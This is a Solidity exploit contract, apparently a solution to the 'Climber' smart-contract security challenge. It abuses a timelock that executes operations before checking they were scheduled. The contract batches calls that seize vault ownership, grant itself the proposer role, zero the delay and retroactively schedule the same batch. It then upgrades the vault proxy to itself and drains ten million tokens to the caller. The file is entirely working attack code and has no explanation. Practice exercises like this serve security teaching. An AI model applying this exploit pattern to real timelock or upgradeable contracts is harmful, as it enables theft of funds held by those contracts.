// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SafeTransferLib} from "solady/src/utils/SafeTransferLib.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";

import {PROPOSER_ROLE, ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";

contract ClimberTimelockAttack is UUPSUpgradeable {
    ClimberTimelock private immutable CLIMBER_TIMELOCK;
    ClimberVault private immutable CLIMBER_VAULT;

    constructor(address climberTimeLock, address climberVault) {
        CLIMBER_TIMELOCK = ClimberTimelock(payable(climberTimeLock));
        CLIMBER_VAULT = ClimberVault(climberVault);
    }

    function attack(address token) public {
        uint256 operationNum = 4;
        address[] memory targets = new address[](operationNum);
        uint256[] memory values = new uint256[](operationNum);
        bytes[] memory dataElements = new bytes[](operationNum);
        bytes32 salt;

        // 1. transfer ownership to address(this)
        targets[0] = address(CLIMBER_VAULT);
        dataElements[0] = abi.encodeCall(OwnableUpgradeable.transferOwnership, (address(this)));

        // 2. grant role
        targets[1] = address(CLIMBER_TIMELOCK);
        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));

        // 3. update delay
        targets[2] = address(CLIMBER_TIMELOCK);
        dataElements[2] = abi.encodeCall(ClimberTimelock.updateDelay, (0));

        // 4. schedule operation
        targets[3] = address(this);
        dataElements[3] = abi.encodeCall(this.scheduleOperation, ());

        CLIMBER_TIMELOCK.execute(targets, values, dataElements, salt);

        UUPSUpgradeable(address(CLIMBER_VAULT)).upgradeToAndCall(
            address(this), abi.encodeCall(this.withdraw, (token, msg.sender))
        );
    }

    function scheduleOperation() public {
        uint256 operationNum = 4;
        address[] memory targets = new address[](operationNum);
        uint256[] memory values = new uint256[](operationNum);
        bytes[] memory dataElements = new bytes[](operationNum);
        bytes32 salt;

        // 1. transfer ownership to address(this)
        targets[0] = address(CLIMBER_VAULT);
        dataElements[0] = abi.encodeCall(OwnableUpgradeable.transferOwnership, (address(this)));

        // 2. grant role
        targets[1] = address(CLIMBER_TIMELOCK);
        dataElements[1] = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));

        // 3. update delay
        targets[2] = address(CLIMBER_TIMELOCK);
        dataElements[2] = abi.encodeCall(ClimberTimelock.updateDelay, (0));

        // 4. schedule operation
        targets[3] = address(this);
        dataElements[3] = abi.encodeCall(this.scheduleOperation, ());

        CLIMBER_TIMELOCK.schedule(targets, values, dataElements, salt);
    }

    function withdraw(address token, address to) public {
        SafeTransferLib.safeTransfer(token, to, 10000000 ether);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
